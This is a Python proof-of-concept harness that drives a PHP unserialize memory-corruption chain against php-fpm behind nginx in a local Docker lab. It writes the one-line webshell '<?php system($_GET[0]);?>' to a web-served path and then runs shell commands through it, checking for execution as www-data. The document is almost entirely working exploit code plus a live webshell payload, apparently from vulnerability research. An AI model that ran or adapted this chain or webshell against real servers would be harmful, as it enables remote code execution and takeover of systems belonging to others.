#!/usr/bin/env python3
"""Fire the K-free SETTLED (warm-endpoint) ps_files->basedir file-write as CODE on
php-fpm behind nginx (kfree_stagefed_forge.py).

End-to-end, fresh-container-per-trial, black-box, loud, BOTH endpoints pre-warmed
(the realistic target state a live `unserialize` endpoint is always in):
  fresh container -> pre-touch arm.php (benign unserialize) + stage endpoint -> arm
  (approved unserialize OOM, embedded-E n1=900) -> stage (stale-tail carrier + stage-fed
  path backing + webshell) writing the webshell to /var/www/html/pub/pwned.php ->
  GET /pub/pwned.php?0=<nonce cmd> -> capture output.

PASS = the file was written AND the GET carries the per-trial nonce AND uid=..(www-data)
AND the worker PID is unchanged (survived).

No observer/proc read is in the ATTACK path. --loud adds ONE observer read to assert
the arm produced the expected SETTLED d_choff and FAIL LOUD (never silent skip).

Lab: profile fpmfire (fpmps + writable web-served /pub):
    docker compose -f docker-compose.fpm-avenues.yml --profile fpmfire up -d --build
    # nginx 127.0.0.1:18085
Run:
    python3 -I poc/chains/verify_fpm_stagefed_fire.py [ntrials] [--loud]

Measured: 12/12 against the byte-identical disposable lab; re-verify here per the
fresh-container rule.
"""
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.write.kfree_stagefed_forge import (  # noqa: E402
    SETTLED_CONST, arm_parts, pretouch_parts, session_record, stage_parts)
from common.multipart import multipart_tuple  # noqa: E402

REPO = os.path.dirname(_POC_ROOT)
COMPOSE_FILE = os.path.join(REPO, "docker-compose.fpm-avenues.yml")
LAB = os.path.join(REPO, "lab", "fpmfire")
BASE = "http://127.0.0.1:18085"
PROFILE = "fpmfire"
CONTAINER = "p2s-fpmfire-fpm"
SID = "sess0000000000000000000000000001"
SF = "/tmp/sess_" + SID
WEBSHELL = b"<?php system($_GET[0]);?>"
TARGET = "/var/www/html/pub/pwned.php"
URLPATH = "/pub/pwned.php"
BND = b"----l2"


def comp(*a, t=180):
    return subprocess.run(["docker", "compose", "-f", COMPOSE_FILE, "--profile", PROFILE, *a],
                          cwd=REPO, capture_output=True, text=True, timeout=t)


def dx(*c, t=30):
    return subprocess.run(["docker", "exec", CONTAINER, *c], capture_output=True, text=True, timeout=t).stdout


def http(path, data=None, ct=None, t=90, cookie=False):
    req = urllib.request.Request(BASE + path, data=data)
    if ct:
        req.add_header("Content-Type", ct)
    if cookie:
        req.add_header("Cookie", "PHPSESSID=" + SID)
    try:
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return None, repr(e).encode()


def wpid():
    s, b = http("/probe.php", t=8)
    return b.split(b":", 1)[1].decode().strip() if (s == 200 and b.startswith(b"ALIVE:")) else None


def ready():
    for _ in range(80):
        if wpid():
            return True
        time.sleep(0.5)
    return False


def d_choff_observed():
    for tok in dx("php", "/tmp/observer.php").split():
        if tok.startswith("unser.data="):
            return int(tok.split("=")[1], 16) & 0x1fffff
    return None


def trial(i, loud, dump=False):
    comp("down", t=90)
    if comp("up", "-d", "--build").returncode != 0 or not ready():
        return f"trial {i}: SKIP (boot)", False
    if loud:
        subprocess.run(["docker", "cp", os.path.join(LAB, "observer.php"), f"{CONTAINER}:/tmp/observer.php"],
                       capture_output=True)
    p0 = wpid()
    dx("sh", "-c", f"printf %s '{session_record().decode()}' > {SF}; chown www-data {SF}")
    # pre-touch BOTH endpoints -> force the deterministic SETTLED layout (realistic target)
    pbody, ph = multipart_tuple(pretouch_parts(), BND)
    http("/arm.php", data=pbody, ct=ph["Content-Type"])
    http("/echo.php")
    # arm (approved unserialize OOM, embedded-E)
    abody, ah = multipart_tuple(arm_parts(), BND)
    http("/arm.php", data=abody, ct=ah["Content-Type"])
    if loud:
        dch = d_choff_observed()
        if dch != SETTLED_CONST["d_choff"]:
            return f"trial {i}: FAIL-LOUD d_choff=0x{(dch or 0):x} != 0x{SETTLED_CONST['d_choff']:x}", False
    # stage: stale-tail carrier + stage-fed path backing; webshell becomes a session key
    parts, _ = stage_parts(TARGET, WEBSHELL)
    sbody, sh = multipart_tuple(parts, BND)
    http("/echo.php", data=sbody, ct=sh["Content-Type"], cookie=True)
    ls = dx("sh", "-c", f"ls {TARGET} 2>&1").strip()
    wrote = TARGET in ls and "No such" not in ls
    if dump and wrote:
        print(f"   [dump] {TARGET} first 120B: "
              f"{dx('sh','-c', f'head -c 120 {TARGET}').strip()!r}")
    nonce = "FIRE%08x" % (int.from_bytes(os.urandom(4), "big"))
    s, b = http(f"{URLPATH}?0={urllib.parse.quote('echo '+nonce+';id')}", t=15)
    body = b.decode("latin-1", "replace") if b else ""
    fired = (nonce in body) and bool(re.search(r"uid=\d+\(www-data\)", body))
    p1 = wpid()
    survived = p1 is not None and p1 == p0
    ok = wrote and fired and survived
    uid = re.search(r"uid=\d+\([^)]*\)", body)
    return (f"trial {i}: wrote={wrote} fired={fired} survived={survived} p0={p0} p1={p1} "
            f"uid='{uid.group(0) if uid else 'n/a'}' -> {'PASS' if ok else 'FAIL'}"), ok


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 and sys.argv[1].isdigit() else 5
    loud = "--loud" in sys.argv
    if subprocess.run(["docker", "version"], capture_output=True).returncode != 0:
        print("SKIP: docker unavailable"); return
    results = []
    for i in range(1, n + 1):
        line, ok = trial(i, loud, dump=(i == 1))
        print(line, flush=True)
        results.append(ok)
    comp("down", t=90)
    npass = sum(results)
    print(f"\n{'PASS' if npass == n else 'FAIL'}: {npass}/{n} fired command execution "
          f"(uid-in-hand) via settled stage-fed file-write + GET{' [loud d_choff]' if loud else ''}")


if __name__ == "__main__":
    main()
